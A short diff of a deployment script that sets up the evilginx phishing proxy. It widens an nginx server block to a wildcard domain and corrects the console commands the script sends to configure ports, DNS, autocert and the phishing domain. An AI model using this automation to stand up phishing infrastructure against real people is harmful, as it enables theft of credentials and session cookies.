@@ -423,7 +423,7 @@ server {
 server {
     listen 443 ssl;
     http2 on;
-    server_name $EP1.$DOMAIN $EP2.$DOMAIN $EP3.$DOMAIN;
+    server_name .${DOMAIN};
 
     ssl_certificate $cert_dir/fullchain.pem;
     ssl_certificate_key $cert_dir/privkey.pem;
@@ -629,13 +629,13 @@ expect {
         # Engine is initialized and database is ready for commands
         expect -re "evilginx\s+>\s*$"
         
-        send "config proxy https_port 8443\r"
+        send "config https_port 8443\r"
         expect -re "evilginx\s+>\s*$"
-        send "config proxy http_port 8081\r"
+        send "config http_port 8081\r"
         expect -re "evilginx\s+>\s*$"
-        send "config proxy dns_port 0\r"
+        send "config dns_port 0\r"
         expect -re "evilginx\s+>\s*$"
-        send "config proxy autocert off\r"
+        send "config autocert off\r"
         expect -re "evilginx\s+>\s*$"
         send "config domain $DOMAIN\r"
         expect -re "evilginx\s+>\s*$"
